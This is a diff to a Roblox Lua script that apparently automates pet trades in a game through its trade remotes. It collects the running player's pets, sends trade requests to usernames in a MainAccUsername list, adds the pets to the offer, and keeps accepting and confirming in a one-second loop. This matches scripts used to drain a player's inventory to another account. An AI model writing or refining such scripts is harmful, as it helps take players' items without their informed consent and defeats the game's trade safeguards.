@@ -2,21 +2,20 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local API = ReplicatedStorage:FindFirstChild("API")
-local addItemRemote = API and API:FindFirstChild("TradeAPI/AddItemToOffer")
+
+-- =================================================
+
+local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
 local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
-local tradeFunction = API and API:FindFirstChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
+local API = ReplicatedStorage:WaitForChild("API")
 
 local successClientData, ClientData = pcall(function()
 	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 end)
 
-local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
+local function getMultipleUniqueIdsByName(itemName, limit)
 	if not successClientData or not ClientData then
-		return {}
-	end
-
-	if type(ClientData.get_data) ~= "function" then
 		return {}
 	end
 
@@ -30,18 +29,9 @@ local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
 	local uniqueIds = {}
 	for uniqueId, itemData in pairs(playerData.inventory.pets) do
 		if itemData and itemData.kind == itemName then
-			local properties = itemData.properties or {}
-			local isNeon = properties.neon == true
-			local isMegaNeon = properties.mega_neon == true
-			local matchesForm = itemForm == "NEON" and isNeon and not isMegaNeon
-				or itemForm == "MEGA_NEON" and isMegaNeon
-				or itemForm == "NORMAL" and not isNeon and not isMegaNeon
-
-			if matchesForm then
-				table.insert(uniqueIds, uniqueId)
-				if #uniqueIds >= limit then
-					break
-				end
+			table.insert(uniqueIds, uniqueId)
+			if #uniqueIds >= limit then
+				break
 			end
 		end
 	end
@@ -51,19 +41,16 @@ end
 local function sendTradeRequest(playerName)
 	local targetPlayer = Players:FindFirstChild(playerName)
 	if not targetPlayer then
+		warn("Player not found in server: " .. playerName)
 		return
 	end
-
+	
 	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
 		sendTradeRemote:FireServer(targetPlayer)
 	end
 end
 
 local function acceptTradeForAll()
-	if not tradeFunction or not tradeFunction:IsA("RemoteFunction") then
-		return
-	end
-
 	for _, targetPlayer in ipairs(Players:GetPlayers()) do
 		if targetPlayer ~= Players.LocalPlayer then
 			local args = {
@@ -83,7 +70,7 @@ task.spawn(function()
 		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
 			for _, playerName in ipairs(MainAccUsername) do
 				if Players:FindFirstChild(playerName) then
-					local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, TARGET_ITEM_FORM, 18)
+					local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, 18)
 
 					for _, uniqueId in ipairs(uniqueIds) do
 						pcall(function()
@@ -125,8 +112,15 @@ local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")
 
 local function RunTradeAutomation()
     while true do
-		AcceptNeg:FireServer()e
-		ConfirmTrade:FireServer()
+		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
+			for _, playerName in ipairs(MainAccUsername) do
+				if Players:FindFirstChild(playerName) then
+					AcceptNeg:FireServer()
+					ConfirmTrade:FireServer()
+					break
+				end
+			end
+		end
         task.wait(1) -- Wait 1 second before the next loop
     end
 end
